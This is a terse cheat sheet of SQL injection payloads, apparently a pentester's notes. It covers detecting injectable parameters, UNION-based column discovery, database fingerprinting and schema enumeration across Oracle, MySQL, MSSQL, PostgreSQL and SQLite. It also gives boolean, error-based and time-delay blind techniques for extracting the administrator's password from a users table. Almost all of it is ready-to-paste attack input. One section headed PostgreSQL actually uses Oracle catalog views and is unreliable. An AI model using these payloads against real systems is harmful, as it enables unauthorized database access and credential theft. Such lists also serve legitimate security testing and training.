#Determinig SQLi Vulnerablity

1 or 1=1-- - >> Input box non string.

1' or 1=1-- - >> Input box string.



#Determining column numbers

' order by 1-- -

' union select null, null from dual-- - >> Oracle

' union select null, null-- - >> Non Oracle

union select null, null >> Without quote in vulnerable parameter

and 1=2 union select null, null >> Without quote in vulnerable parameter



#To find a column containing strings

' union select null, 'null', null-- -



#To identify vulnerable columns

' union select 1,2,3,4-- -

union select 1,2,3,4 >> Without quote in vulnerable parameter

and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter



#To fetch database version

' union select banner, null from v$version-- - >> Oracle

' union select null, @@version-- - >> Mysql, MSsql

' union select null, version()-- - >> PostgreSQL

' union select null, sqlite_version()-- - >> SQLite



#SQLite Database info retrieving

(SELECT group_concat(tbl_name) FROM sqlite_master)

(SELECT sql FROM sqlite_master WHERE name ='[table name here]') >> To retrieve data from one table.

(SELECT sql FROM sqlite_master) >> Useful to retrieve all table and column in a single payload.

(SELECT group_concat([column name here]) from [table name here])

(SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 



#PostgreSQL Database info retrieving

' union SELECT table_name,null FROM all_tables-- -

' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - 

' union select [column name here],null from [table name here]-- - 



#PostgreSQL Database info retrieving

' union SELECT table_name,null FROM information_schema.tables-- -

' union SELECT column_name,null FROM information_schema.columns WHERE table_name='[table name]'-- -

' union select [column name here],null from [table name here]-- -



#Mysql Database info retrieving

' union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]'

' union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1

' union select null,null,[column name here],null from [table name here]

and 1=2 union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]' >> Without qoute in vulnerable parameter

and 1=2 union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1

and 1=2 union select null,null,[column name here],null from [table name here]



#Blind based Boolean SQL injection with conditional responses (Visible message)

' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.

' and (select username from users where username='administrator')='administrator'-- - >> To determine the username

' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -

' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -



#Blind SQL injection with conditional errors (No visible message)

' || (select ' ') || ' >> Non Oracle

' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.



#Blind SQL injection with conditional errors to determine a table, other info exist or not

' || (select ' ' from [table name here] where rownum = 1) || '-- - >> Oracle #200 ok means that table exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and LENGTH(password)>20 >> Oracle #500 error means exists.

select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and SUBSTRING(password,1,1)='a' >> Oracle #500 error means exists.



#Blind SQL injection with time delays

' UNION SELECT SLEEP(5);-- -

' || (dbms_pipe.receive_message(('a'),10))-- - >> Oracle

' || (WAITFOR DELAY '0:0:10')-- - >> Microsoft

' ||  (SELECT pg_sleep(10))-- - >> PostgreSQL

' ||  (SELECT SLEEP(10))-- - >> MySQL



#Blind SQL injection with time delays and information retrieval

1) PostrgreSQL

' || (select case when (1=1) then pg_sleep(10 ) else pg_sleep (-1) end)-- -

' || (select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- - or, ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users-- -

' || (select case when (username='[username here]') then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- -

' || (select case when (username='[username here]' and LENGTH(password)>n) then pg_sleep(10) else pg_sleep(-1) end from users)-- -

';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--



#Visible Error-Based Sql Injection

'||cast((select version() LIMIT 1) AS INT)--

'||cast((select username from users LIMIT 1) AS INT)--  >> cast for PostgreSQL

'||cast((select password from users LIMIT 1) AS INT)--

